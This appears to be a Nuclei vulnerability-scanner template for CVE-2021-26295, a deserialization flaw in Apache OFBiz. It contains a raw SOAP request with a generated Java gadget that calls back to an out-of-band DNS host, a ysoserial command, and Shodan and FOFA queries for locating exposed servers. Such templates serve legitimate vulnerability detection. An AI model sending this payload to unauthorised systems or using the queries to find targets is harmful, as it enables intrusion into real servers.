http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - condition: and
    part: body
    type: word
    words:
    - errorMessage
  - part: header
    type: word
    words:
    - OFBiz.Visitor=
  matchers-condition: and
  raw:
  - "POST /webtools/control/SOAPService HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ application/xml\n\n<?xml version='1.0' encoding='UTF-8'?>\n<soapenv:Envelope\n\
    \  xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soapenv:Header/>\n\
    \    <soapenv:Body>\n      <ns1:clearAllEntityCaches xmlns:ns1=\"http://ofbiz.apache.org/service/\"\
    >\n          <ns1:cus-obj>{{generate_java_gadget(\"dns\", \"https://{{interactsh-url}}\"\
    , \"hex\")}}</ns1:cus-obj>\n      </ns1:clearAllEntityCaches>\n    </soapenv:Body>\n\
    </soapenv:Envelope>\n"
id: CVE-2021-26295
info:
  author: madrobot
  classification:
    cpe: cpe:2.3:a:apache:ofbiz:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-26295
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-502
    epss-percentile: 0.99921
    epss-score: 0.94237
  description: 'Apache OFBiz has unsafe deserialization prior to 17.12.06. An unauthenticated
    attacker can use this vulnerability to successfully take over Apache OFBiz.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the affected system.

    '
  metadata:
    fofa-query:
    - body="ofbiz"
    - app="apache_ofbiz"
    max-request: 1
    product: ofbiz
    shodan-query:
    - OFBiz.Visitor=
    - http.html:"ofbiz"
    - ofbiz.visitor=
    vendor: apache
    verified: true
    ysoserial-payload: java -jar ysoserial.jar URLDNS https://oob-url-to-request.tld
      | hex
  name: Apache OFBiz <17.12.06 - Arbitrary Code Execution
  reference:
  - https://github.com/yumusb/CVE-2021-26295-POC
  - https://packetstormsecurity.com/files/162104/Apache-OFBiz-SOAP-Java-Deserialization.html
  - https://github.com/zhzyker/exphub/tree/master/ofbiz
  - https://lists.apache.org/thread.html/r3c1802eaf34aa78a61b4e8e044c214bc94accbd28a11f3a276586a31%40%3Cuser.ofbiz.apache.org%3E
  - https://lists.apache.org/thread.html/r6e4579c4ebf7efeb462962e359501c6ca4045687f12212551df2d607@%3Cnotifications.ofbiz.apache.org%3E
  - https://nvd.nist.gov/vuln/detail/CVE-2021-26295
  remediation: 'Upgrade Apache OFBiz to version 17.12.06 or later to mitigate this
    vulnerability.

    '
  severity: critical
  tags: cve2021,cve,packetstorm,apache,ofbiz,deserialization,rce,vkev,vuln
